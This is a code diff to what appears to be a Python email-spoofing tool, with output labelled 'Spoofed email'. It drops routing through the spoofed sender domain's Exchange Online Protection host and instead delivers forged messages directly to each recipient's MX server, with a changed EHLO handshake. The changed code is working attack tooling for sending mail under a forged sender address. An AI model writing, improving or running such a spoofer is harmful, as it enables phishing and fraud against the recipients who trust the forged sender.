@@ -303,7 +303,7 @@ def send_email(smtp_host, sender, recipient, subject, body):
             f"MIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n{body}"
         )
         with smtplib.SMTP(smtp_host, 25) as server:
-            server.ehlo(sender_domain)
+            server.ehlo_or_helo_if_needed()
             server.mail(sender)
             code, msg = server.rcpt(recipient)
             if code != 250:
@@ -900,27 +900,12 @@ def main():
             subject, body = cfg
             print(f"  [*] Spoofed email → {len(recipients)} recipient(s)")
 
-        sender_domain = args.sender.split("@")[1]
-        smtp_ip = None
-        route = ""
-        eop_host = get_eop_hostname(sender_domain)
-        try:
-            smtp_ip = dns.resolver.resolve(eop_host, "A")[0].to_text()
-            route = f"EOP → {eop_host}"
-        except Exception:
-            pass
-
-        if not smtp_ip:
-            smtp_ip = get_mx_record(recipients[0].split("@")[1])
-            route = f"MX → {recipients[0].split('@')[1]}"
-
-        if not smtp_ip:
-            print(f"  {RED}[!]{RESET} No route found")
-            return
-
-        print(f"  {DIM}[→] {route}{RESET}")
         for rcp in recipients:
-            send_email(smtp_ip, args.sender, rcp, subject, body)
+            rcp_domain = rcp.split("@")[1]
+            mx = get_mx_record(rcp_domain)
+            if not mx:
+                continue
+            send_email(mx, args.sender, rcp, subject, body)
         return
 
     parser.print_help()
